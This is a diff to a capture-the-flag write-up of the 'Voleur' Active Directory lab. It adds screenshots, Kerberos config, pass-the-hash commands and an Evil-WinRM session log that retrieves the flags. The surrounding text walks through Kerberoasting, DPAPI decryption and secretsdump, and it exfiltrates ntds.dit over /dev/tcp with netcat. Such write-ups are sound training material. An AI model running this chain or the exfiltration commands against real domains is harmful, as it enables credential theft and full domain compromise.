@@ -62,9 +62,13 @@ Bash
 ```
 bloodhound-python -u ryan.naylor -p HollowOct31Nyt -k -ns 10.10.11.76 -c All -d voleur.htb --zip
 ```
+
 ![Overview](Pictures/htb_voleur_start.png)
+
 This shows that ryan.naylor has no direct power but is a member of a "special group."
+
 ![User](Pictures/htb_voleur_start_user.png)
+
 SMB Share Enumeration: A detailed enumeration of SMB shares reveals several interesting directories.
 
 Bash
@@ -74,6 +78,10 @@ NetExec smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
 This command reveals the IT share, which is readable.
 
 File Discovery in IT Share: Using impacket-smbclient, the IT share is explored. A directory First-Line Support contains an Excel file named Access_Review.xlsx.
+
+**Overview**
+
+![Overview](Pictures/htb_voleur_Overview.png)
 
 The file is downloaded.
 
@@ -90,6 +98,11 @@ svc_ldap: M1.......qT5Vn
 svc_iis: N5.......Z8
 
 ### Privilege Escalation (Part 1) - Targeted Kerberoasting
+
+**Overview**
+
+![Targeted_Kerberoasting](Pictures/htb_voleur_svcldap_Gen_R_Lacey.png)
+
 Using the svc_ldap credentials, a new attack vector is identified.
 
 Re-authentication: A new TGT is obtained for svc_ldap.
@@ -114,8 +127,13 @@ Bash
 ```
 evil-winrm -i dc.voleur.htb -u svc_winrm -p '<cracked_password>'
 ```
+
+![User_flag](Pictures/htb_voleur_svc_winrm_user_flag.png)
+
 ### Privilege Escalation (Part 2) - Restoring a Deleted User
 Inside the WinRM session, the tester discovers that the svc_ldap account belongs to the RESTORE_USERS group, suggesting a path to restore deleted user accounts.
+
+![Restore](Pictures/htb_voleur_svc_ldap_b_restore.png)
 
 User Impersonation: To leverage the RESTORE_USERS group's permissions, the svc_ldap user is impersonated from the svc_winrm session using RunasCs.exe.
 
@@ -138,6 +156,8 @@ DPAPI Key Retrieval: Re-enumerating SMB shares reveals a new directory structure
 08949382-XXXX-4c63-b93c-ce52efc0aa88 (Master Key)
 
 772275FAD58XXXXX3490A9B0039791D3 (Credential file)
+
+![Overview](Pictures/htb_voleur_Todd_Second_Tech.png)
 
 DPAPI Decryption: Using impacket-dpapi, the master key and credential file are decrypted with Todd Wolfe's password (Nig........3on14).
 
@@ -170,8 +190,11 @@ chmod 600 id_rsa
 ssh -i id_rsa svc_backup@voleur.htb -p 2222
 ```
 NTDS and SYSTEM File Exfiltration: Inside the SSH session, the C drive is mounted at /mnt/c. The svc_backup user has access to a Backups/Active Directory directory within C:\IT\Third-Line Support. This directory contains the critical ntds.dit and SYSTEM files. These files are exfiltrated using netcat.
-![User](Pictures/htb_voleur_Admin_hash_prep.png)
+
+![Admin](Pictures/htb_voleur_Admin_hash_prep.png)
+
 Bash
+
 ```
 # On the target
 cat ntds.dit > /dev/tcp/10.10.16.48/8888
@@ -180,14 +203,150 @@ cat SYSTEM > /dev/tcp/10.10.16.48/8888
 nc -lvnp 8888 > ntds.dit
 nc -lvnp 8888 > SYSTEM
 ```
+
 Final Hash Dump: The exfiltrated ntds.dit and SYSTEM files are used with impacket-secretsdump on the local machine to dump all domain credentials, including the NTLM hashes for all users and the krbtgt account.
 
 Bash
 ```
 impacket-secretsdump -ntds ntds.dit -system SYSTEM local
+impacket-getTGT voleur.htb/'administrator' -hashes ':e656e07c5XXXXXXXXXXXXXXXXXXX'
+export KRB5CCNAME=/home/XXXXXXXXXXXx/ctf_OpenVPN/administrator.ccache
 ```
 
+
+**add that configuration to the Kerberos configuration file:**
+
+bash
+
+Open the file with root permissions:
+
+bash
+```
+sudo nano /etc/krb5.conf
+```
+Replace or update the content like this:
+
+```
+[libdefaults]
+    default_realm = VOLEUR.HTB
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+
+[realms]
+    VOLEUR.HTB = {
+        kdc = dc.voleur.htb
+    }
+
+[domain_realm]
+    .voleur.htb = VOLEUR.HTB
+    voleur.htb = VOLEUR.HTB
+```
+![Modify KRB5](Pictures/htb_voleur_modifykrb5conf.png)
+
 This final command provides the highest level of access and completes the penetration test.
+
+![Root Flag](Pictures/htb_voleur_svc_winrm_root_flag.png)
+
+```
+evil-winrm -i dc.voleur.htb -k administrator.ccache -r voleur.htb 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: Useless cert/s provided, SSL is not enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+
+
+    Directory: C:\Users\Administrator\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         1/30/2025   6:20 AM                WindowsPowerShell
+-a----          5/7/2025   4:57 PM            108 cleanup.ps1
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         1/29/2025   1:12 AM           2308 Microsoft Edge.lnk
+-ar---          8/1/2025  11:02 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+5edXXXXXXXXXXXXXXXXXXff688f
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd C:\Users\
+*Evil-WinRM* PS C:\Users> ls
+                                                                                                                                                              
+                                                                                                                                                              
+    Directory: C:\Users                                                                                                                                       
+                                                                                                                                                              
+                                                                                                                                                              
+Mode                 LastWriteTime         Length Name                                                                                                        
+----                 -------------         ------ ----                                                                                                        
+d-----          6/5/2025   3:30 PM                Administrator                                                                                               
+d-----         1/29/2025   7:11 AM                jeremy.combs
+d-r---         1/28/2025  12:35 PM                Public
+d-----         1/30/2025   3:39 AM                svc_bxxxxxxx
+d-----         1/29/2025   4:47 AM                svc_lxxx
+d-----         1/29/2025   7:07 AM                svc_wxxxx
+d-----         1/29/2025   4:53 AM                todd.wolfe
+
+
+*Evil-WinRM* PS C:\Users> cd svc_wxxxx
+*Evil-WinRM* PS C:\Users\svc_wxxxx> ls
+
+
+    Directory: C:\Users\svc_wxxx
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---         1/29/2025   7:07 AM                3D Objects
+d-r---         1/29/2025   7:07 AM                Contacts
+d-r---         1/31/2025   1:55 AM                Desktop
+d-r---          8/2/2025   5:42 AM                Documents
+d-r---         1/29/2025   7:07 AM                Downloads
+d-r---         1/29/2025   7:07 AM                Favorites
+d-r---         1/29/2025   7:07 AM                Links
+d-r---         1/29/2025   7:07 AM                Music
+d-r---         1/29/2025   7:07 AM                Pictures
+d-r---         1/29/2025   7:07 AM                Saved Games
+d-r---         1/29/2025   7:07 AM                Searches
+d-r---         1/29/2025   7:07 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\svc_wixxxx> cd Desktop
+*Evil-WinRM* PS C:\Users\svc_wixxxx\Desktop> ls
+
+
+    Directory: C:\Users\svc_winrm\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
+-ar---          8/1/2025  11:02 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\svc_xxxxx\Desktop> cat user.txt
+e94XXXXXXXXXXXXXXXXXXXXXXXXXXXX0144
+*Evil-WinRM* PS C:\Users\svc_wxxxx\Desktop> 
+
+
+```
+
 
 
 #### 🏁 Summary of Attack Chain
